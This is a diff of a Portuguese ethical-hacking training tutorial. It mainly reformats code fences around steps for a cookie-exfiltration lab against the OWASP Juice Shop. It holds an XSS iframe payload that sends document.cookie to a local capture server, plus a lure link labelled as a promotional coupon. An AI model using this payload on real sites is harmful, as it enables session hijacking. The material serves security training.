@@ -102,9 +102,11 @@ if __name__ == '__main__':
 
 1° Copiar o código python e salvar como web-srv.py
 
-2° Executar $python ./web-srv.py
-
+2° Executar 
+```bash
+python ./web-srv.py
 ```
+```py
 #!/usr/bin/env python3
 # Treinamento Cibersec e Ethical Hacking 
 # Web Server para Cookies Exfiltration Basic
@@ -126,14 +128,14 @@ if __name__ == '__main__':
 Payload XSS para teste:
 
 3° Copie o payload e cole no campo de pesquisa do Juice-Shop
-```
+```text
 <iframe srcdoc="<script> fetch('http://127.0.0.1/capture?token='+document.cookie)</script>"></iframe>
 ```
 4°  Verificar no shell o cookie capturado
 
 ## Web-Server Exfiltration Python Estruturado
 
-```
+```text
 Estrutura:
 Web-srv
        |_web-srv.py
@@ -144,7 +146,7 @@ Web-srv
 
 2° Copiar o código python e salvar como web-srv.py dentro do diretório Web-srv
 
-```
+```py
 #!/usr/bin/env python3
 # Treinamento Cibersec e Ethical Hacking 
 # Web Server para Cookies Exfiltration Estruturado
@@ -171,7 +173,7 @@ if __name__ == '__main__':
 
 4° Copiar o código html e salvar como index.html dentro do diretório templates
 
-```
+```htm
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -224,8 +226,10 @@ if __name__ == '__main__':
 </body>
 </html>
 ```
-5° Executar $python ./web-srv.py
-
+5° Executar 
+```bash
+python ./web-srv.py
+``
 6° Acessar o Juice-Shop http://localhost:3000 e logar com algum usuário
 
 7° Acessar o endereço http://127.0.0.1 e clicar no link de Cupom Promocional
